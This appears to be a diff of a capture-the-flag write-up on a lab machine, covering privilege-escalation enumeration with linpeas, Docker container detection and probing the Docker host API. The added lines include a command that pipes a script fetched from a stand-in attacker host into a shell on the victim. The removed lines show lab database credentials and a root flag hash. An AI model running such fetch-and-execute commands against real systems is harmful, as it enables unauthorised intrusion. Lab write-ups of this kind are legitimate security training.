@@ -139,30 +139,37 @@ A successful access to the system has been made, hence the first flag was captur
 ---
 #### 011: Linpeas Enumeration
 
-[CVE-2021-22555] Netfilter heap out-of-bounds write
+A local python server is set up on the attacker at a location where `linpeas.sh` was located.
+On the victim machine `linpeas.sh` was requested and then executed for system enumeration
+- `linpeas -h` | if `linpeas` is already installed the command will redirect to the directory where `linpeash.sh` is
+- `sudo python3 -m http.server 80` | run the python server in `linpeas` directory
+- `curl http://<attacker_ip>/linpeas.sh | sh` | on the victim machine do a GET request and then pipe to the execution of the enumeration script
 
-/var/www/html/cacti/include/vendor/phpseclib/Crypt/RSA.php
+Based on the provided report there where various potential expoitation methods.
+However one that seemed interesting was `/.dockerenv`, which signified that the system we had access to was a docker container.
+Additional verification that the victim was a docker container was with the command `hostname`, which returned a random hex value `821fbd6a43fa` indicating the first 12 characters of the full docker 64 hex character id.
 
--rwxr-xr-x 1 www-data www-data 97 Sep 13 05:37 /var/www/app/.env
-DB_HOST=mariadb
-DB_PORT=3306
-DB_NAME=monitorsfour_db
-DB_USER=monitorsdbuser
-DB_PASS=f37p2j8f4t0r
+{{< screenshots "shot-013" >}}
 
--rwxr-xr-x 1 www-data www-data 7159 Sep 13 05:38 /var/www/html/cacti/include/config.php
-$database_type     = 'mysql';
-$database_default  = 'cacti';
-$database_username = 'cactidbuser';
-$database_password = '7pyrf6ly8qx4';
-$database_port     = '3306';
-$database_ssl      = false;
-$database_ssl_key  = '';
-$database_ssl_cert = '';
-$database_ssl_ca   = '';
-#$rdatabase_type     = 'mysql';
-#$rdatabase_default  = 'cacti';
-#$rdatabase_username = 'cactiuser';
-#$rdatabase_password = 'cactiuser';
+---
+#### 012: Containerization
+
+Furthermore, in /etc/hosts an entry showed a self-mapping for a docker container, confirming the environment is set in a docker gateway bridge.
+
+{{< screenshots "shot-014" >}}
+
+---
+#### 013: Docker API
+
+As described the victim machine being Windows, it was assumed that the host was a Windows machine.
+https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai provided a brief guide towards accessing the Docker API through a container.
+`host.docker.internal` is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
+A probe was made to `host.docker.internal` with the use of `curl`, and the name resolution resolved to `192.168.65.254` on `port 80`.
+Essentially, the command returned an output that described the container has access to the host's nginx server. 
+- `curl -v http://host.docker.internal` | switch sets `curl` to verbose-mode
+
+{{< screenshots "shot-015" >}}
+
+---
 
 - root: 35713cf72da6c0530e65ce8f42a16e26
